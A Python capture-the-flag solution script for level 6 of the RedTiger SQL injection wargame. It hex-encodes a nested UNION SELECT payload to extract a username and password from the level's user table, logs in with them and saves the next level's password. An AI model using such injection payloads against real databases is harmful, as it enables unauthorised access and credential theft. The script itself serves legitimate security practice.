#!/usr/bin/env python3
import pickle
import tigers as tg


def str_to_hex(s: str) -> str:
    return '0x' + (s.encode('utf-8')).hex()
    


def main():
    '''
    Target: Get the first user in table level6_users with status 1
    '''
    url = "https://redtiger.labs.overthewire.org/level6.php"
    base_name = 'level6_users'
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level6login' not in cooks:
            print('use prevision level')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    cook = dict(level6login=cooks['level6login'])

    # Counting the number of columns
    p = "' union select username,username,password,password,password from level6_users where status=1 #"
    h = str_to_hex(p)
    print(h)

    
    #param = dict(user=f'0 union select 1,{h},3,4,5 from {base_name} where status=1')
    
    #response = tg.get_request(url, param, cook)
    #print(response)
    
    html_visible = tg.get_request(url, dict(user='1'), cook)
 
    keys = tg.find_param(url, len(finds), html_visible,
                         f'0 union select 1,{h},3,4,5 from {base_name} where status=1',
                         'user', cook)   
    print('keys', keys)
    
    # Authorization
    data = dict(user=keys[0], password=keys[1], login='Login')
    response = tg.get_request(url, data, cook, method='post')     
     
    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    # Save cookie
    if ('level7login' not in cooks) or (cooks['level7login'] != passw):
        cooks['level7login'] = passw
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()





